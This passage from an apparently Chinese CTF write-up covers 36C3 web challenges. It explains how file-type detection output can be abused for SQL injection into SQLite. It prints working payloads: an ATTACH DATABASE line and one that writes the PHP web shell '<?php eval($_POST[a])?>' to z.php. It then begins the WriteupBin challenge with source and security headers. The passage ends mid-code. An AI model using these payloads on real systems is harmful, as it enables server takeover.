&#x7684;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x7EB5;&#x89C2;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x5236;&#x7684;&#x8F93;&#x5165;&#x70B9;&#x4E5F;&#x53EA;&#x6709;&#x5728;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x5F53;&#x4E2D;&#xFF0C;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x53C8;&#x88AB;&#x62FC;&#x5165;&#x5230;&#x4E86; sql &#x8BED;&#x53E5;&#x5F53;&#x4E2D;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s = <span class="hljs-string">&quot;INSERT INTO upload(info) VALUES (&apos;&quot;</span> .(<span class="hljs-keyword">new</span> finfo)-&gt;file($_FILES[<span class="hljs-string">&apos;file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>]). <span class="hljs-string">&quot; &apos;);&quot;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6765;&#x8FDB;&#x884C; sql &#x6CE8;&#x5165;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p><p>&#x6211;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F; fuzz &#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x67D0;&#x4E9B;&#x6587;&#x4EF6;&#x4F7F;&#x7528;<code>finfo</code>&#x5F97;&#x51FA;&#x6765;&#x7684;&#x7ED3;&#x679C;&#x542B;&#x6709;&#x5355;&#x5F15;&#x53F7;&#x4EC0;&#x4E48;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8FD8;&#x80FD;&#x591F;&#x63D2;&#x5165;&#x53EF;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x5C31;&#x5F00;&#x59CB; fuzz &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x4ECE;<code>0x00</code>&#x5230;<code>0xff0xff</code>&#x3002;</p><p>&#x7EC8;&#x4E8E;&#x5728;<code>0x1f0x9d</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>compress&apos;d data</code>&#xFF0C;&#x867D;&#x7136;&#x6709;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x662F;<code>0xfb0x01</code>&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;<code>QDOS object &apos;&apos;</code>&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x5BF9;&#x7684;&#x6837;&#x5B50;&#xFF0C;&#x6709;&#x4E24;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EF;&#x4EE5;&#x5728;&#x5355;&#x5F15;&#x53F7;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x968F;&#x4FBF;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png" alt></p><p>&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x88AB;&#x5403;&#x6389;&#x4E86;&#x4E00;&#x4E2A;<code>p</code>&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x8C03;&#x6574;&#x4E00;&#x4E0B; payload &#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x4E86;&#x3002;</p><p>sqlite &#x662F;&#x53EF;&#x4EE5;&#x7528; .php &#x6587;&#x4EF6;&#x540D;&#x6765;&#x4F5C;&#x4E3A;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x6587;&#x4EF6;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x53EF;&#x5199;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; sqlite attach &#x4E00;&#x4E2A; z.php &#x7684;&#x65B9;&#x6CD5;&#x6765;&#x5199; shell &#x4E86;&#x3002;</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;create TABLE t.e (d text);/*</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;z.php&apos; AS t;insert INTO t.e (d) VALUES (&apos;&lt;?php eval($_POST[a])?&gt;&apos;);/*</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5C31;&#x662F;&#x6709;&#x957F;&#x5EA6;&#x9650;&#x5236;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5206;&#x4E24;&#x6B21;&#x6765;&#x5199; shell</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png" alt></p><h3 id="other-file"><a href="#other-file" class="headerlink" title="other file"></a>other file</h3><p>&#x770B;&#x5176;&#x4ED6;&#x9009;&#x624B;&#x7684;&#x516C;&#x5F00;&#x7684; wp &#x4E5F;&#x662F;&#x5F88;&#x6709;&#x8DA3;&#x7684;&#x4E00;&#x4EF6;&#x4E8B;&#xFF0C;&#x7136;&#x540E;&#x4ECE; ctftime &#x4E0A;&#x516C;&#x5F00;&#x7684; wp&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x8FD8;&#x5B58;&#x5728;&#x7740;&#x8FD9;&#x4E48;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#x3002;</p><h4 id="TeX-DVI-file"><a href="#TeX-DVI-file" class="headerlink" title="TeX DVI file"></a>TeX DVI file</h4><p>0xf702 &#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x5728;&#x586B;&#x5145;&#x4E00;&#x5B9A;&#x6570;&#x636E;&#x540E;&#x6709;&#x6211;&#x4EEC;&#x5B8C;&#x5168;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png" alt></p><h4 id="jpeg"><a href="#jpeg" class="headerlink" title="jpeg"></a>jpeg</h4><p>&#x5728; jpeg &#x7684; EXIF &#x6570;&#x636E;&#x6BB5;&#x4E2D;&#x6709;&#x7528;&#x6765;&#x6807;&#x8BC6; software &#x7684;&#x6570;&#x636E;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x540C;&#x6837;&#x7528;&#x6765;&#x6807;&#x8BC6; comment &#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x63A7;&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; exiftool &#x6765;&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x3002;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -overwrite_original -comment=<span class="hljs-string">&quot;payload&quot;</span> -software=<span class="hljs-string">&quot;payload2&quot;</span> 1.jpg</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png" alt></p><h4 id><a href="#" class="headerlink" title="#!"></a>#!</h4><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#!/</code>&#x7684;&#x6587;&#x4EF6;&#x6765;&#x6784;&#x9020; payload</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png" alt></p><h4 id="gz"><a href="#gz" class="headerlink" title="gz"></a>gz</h4><p>&#x5229;&#x7528;<code>gunzip</code>&#x751F;&#x6210;&#x7684; gz &#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6CE8;&#x5165;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x540D;</p><p><img src="https://posts.xh4h.com/assets/images/36c3/gunzip1.png" alt></p><p>&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4FEE;&#x6539; gz &#x6587;&#x4EF6;&#x5185;&#x5BB9;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png" alt></p><h2 id="WriteUpBin"><a href="#WriteUpBin" class="headerlink" title="WriteUpBin"></a>WriteUpBin</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:13/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz" target="_blank" rel="noopener">WriteupBin-10b65573b511269f.tar.xz</a></p></blockquote><p>&#x4E00;&#x9053;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x4FA7;&#x4FE1;&#x9053;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6240;&#x7ED9;&#x9644;&#x4EF6;&#x642D;&#x5EFA;&#x5F62;&#x5F0F;&#x77E5;&#x9053;&#xFF0C;flag &#x5B58;&#x653E;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x5728; admin &#x7528;&#x6237;&#x7684;&#x7B2C;&#x4E00;&#x6761; writeup &#x6570;&#x636E;&#x7684;&#x5185;&#x5BB9;&#x5F53;&#x4E2D;&#xFF0C;&#x9898;&#x76EE;&#x63D0;&#x4F9B;&#x7B80;&#x5355;&#x7684;&#x4E0A;&#x4F20;&#x6587;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x63D0;&#x4EA4;&#x7ED9; admin &#xFF0C;&#x8BA9; admin &#x7ED9;&#x4F60;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x9879;&#x76EE;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">&#x251C;&#x2500;&#x2500; Dockerfile<span class="hljs-comment">//Docker&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.py</span><span class="hljs-comment">//&#x4F7F;&#x7528;selenium&#x6A21;&#x62DF;admin&#x767B;&#x5F55;&#x5E76;&#x70B9;&#x8D5E;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; db<span class="hljs-selector-class">.sql</span><span class="hljs-comment">//&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; docker-stuff</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; default<span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; www<span class="hljs-selector-class">.conf</span><span class="hljs-comment">//&#x914D;&#x7F6E;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x251C;&#x2500;&#x2500; www</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; general<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x7F6E;header&#x5934;&#x7B49;&#x4E00;&#x4E9B;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; html</span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; add<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x6DFB;&#x52A0;writeup&#x76F8;&#x5173;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x628A;writeup&#x63D0;&#x4EA4;&#x7ED9;admin</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; index<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5165;&#x53E3;&#x6587;&#x4EF6;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; like<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x251C;&#x2500;&#x2500; login_admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//admin&#x767B;&#x9646;&#x64CD;&#x4F5C;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x83B7;&#x53D6;writeup&#x5185;&#x5BB9;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0; &#x2514;&#x2500;&#x2500; views</span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; <span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x5728;&#x9875;&#x9762;&#x4E0A;&#x65B9;&#x5C55;&#x793A;&#x76EE;&#x524D;id&#x63D0;&#x4EA4;&#x7684;writeup</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x251C;&#x2500;&#x2500; home<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x9875;&#x9762;&#x4E2D;&#x90E8;&#x7528;&#x6765;&#x63D0;&#x4F9B;&#x7ED9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x754C;&#x9762;</span></span><br><span class="line">&#x2502;&#xA0;&#xA0;     &#x2514;&#x2500;&#x2500; show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//&#x70B9;&#x8D5E;&#x3001;&#x63D0;&#x4EA4;&#x7ED9;admin&#x7684;&#x5C55;&#x793A;&#x9875;&#x9762;</span></span><br><span class="line">&#x2514;&#x2500;&#x2500; ynetd<span class="hljs-comment">//&#x7528;&#x6765;&#x542F;&#x52A8; admin.py</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x65E2;&#x7136; flag &#x5728;&#x6570;&#x636E;&#x5E93;&#x5F53;&#x4E2D;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x9996;&#x5148;&#x6765;&#x770B;&#x770B; show.php &#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;&#x6765;&#x83B7;&#x53D6; writeup &#x7684;&#x5185;&#x5BB9;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include_once</span> <span class="hljs-string">&apos;../general.php&apos;</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT id, content FROM `writeup` WHERE `id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">&apos;SELECT user_id FROM `like` WHERE `writeup_id` = ?&apos;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">&apos;s&apos;</span>, $_GET[<span class="hljs-string">&apos;id&apos;</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/header.php&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">&apos;../views/show.php&apos;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; id &#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x9274;&#x6743;&#x63AA;&#x65BD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; writeup id &#x6765;&#x83B7;&#x53D6; writeup &#x5185;&#x5BB9;&#xFF0C;&#x800C; flag writeup id &#x5728; admin &#x7528;&#x6237;&#x6570;&#x636E;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x5728; header.php &#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684; writeup id</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($writeups <span class="hljs-keyword">as</span> $w): <span class="hljs-meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="hljs-string">&quot;/show.php?id=&lt;?= $w[&apos;id&apos;] ?&gt;&quot;</span>&gt;Writeup - <span class="hljs-meta">&lt;?</span>= $w[<span class="hljs-string">&apos;id&apos;</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x65E2;&#x7136;&#x6709;&#x63D0;&#x4EA4;&#x4EE3;&#x7801;&#x7ED9; admin &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x4E00;&#x4E2A; xss &#x6216;&#x8005;&#x4EC0;&#x4E48;&#x7684;&#xFF1F;</p><p>&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x518D;&#x6536;&#x5230; writeup &#x540E;&#x7684;&#x4E3B;&#x8981;&#x64CD;&#x4F5C;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="hljs-number">0</span>, size=(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--disable-gpu&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--headless&apos;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">&apos;--no-sandbox&apos;</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="hljs-string">&apos;/usr/bin/chromedriver&apos;</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&apos;</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="hljs-string">&apos;//input[@id=&quot;like&quot;]&apos;</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230; admin &#x5728;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x4E4B;&#x540E;&#x4F7F;&#x7528;<code>find_element_by_xpath</code>&#x627E;&#x5230;&#x4E86; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x70B9;&#x51FB;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x63D0;&#x4EA4;&#x7ED9; admin &#x7684; writeup &#x540E;&#xFF0C;admin &#x4F1A;&#x6D4F;&#x89C8;&#x8FDB;&#x884C;&#x70B9;&#x51FB;&#xFF0C;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E;&#x8BF7;&#x6C42;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/like.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;c&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $_SESSION[&apos;c&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?= $writeup[&apos;id&apos;] ?&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x1F44D;&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B; general.php &#x4E2D;&#x7684;&#x9632;&#x5FA1;&#x63AA;&#x65BD;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start([<span class="hljs-string">&apos;cookie_httponly&apos;</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-string">&apos;cookie_samesite&apos;</span> =&gt; <span class="hljs-string">&apos;Strict&apos;</span>]);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">id</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> bin2hex(random_bytes(<span class="hljs-number">8</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line">header(<span class="hljs-string">&apos;x-xss-protection: 1; mode=block&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;X-Content-Type-Options: nosniff&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;x-frame-options: DENY&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&apos;Referrer-Policy: no-referrer&apos;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Feature-Policy: geolocation &apos;none&apos;; midi &apos;none&apos;; sync-xhr &apos;none&apos;; microphone &apos;none&apos;; camera &apos;none&apos;; magnetometer &apos;none&apos;; gyroscope &apos;none&apos;; speaker &apos;none&apos;; fullscreen &apos;none&apos;; payment &apos;none&apos;; usb &apos;none&apos;; vr &apos;none&apos;; encrypted-media &apos;none&apos;&quot;</span>);</span><br><span class="line">header(<span class="hljs-string">&quot;Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-&quot;</span>.$nonce.<span class="hljs-string">&quot;&apos; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &apos;self&apos;; form-action &apos;self&apos;; frame-ancestors &apos;none&apos;; require-sri-for script style;&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C;<code>script-src</code>&#x8BBE;&#x7F6E;&#x7684; nonce &#x53EA;&#x5728; header.php &#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x800C;&#x4E14;&#x6211;&#x4EEC;&#x4E5F;&#x62FF;&#x4E0D;&#x5230;&#x8FD9;&#x4E2A; nonce</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="hljs-string">&quot;&lt;?=$nonce?&gt;&quot;</span>&gt;</span><br><span class="line">    $(<span class="hljs-string">&apos;#publish-form&apos;</span>).parsley() <span class="hljs-comment">// prevent hacking</span></span><br><span 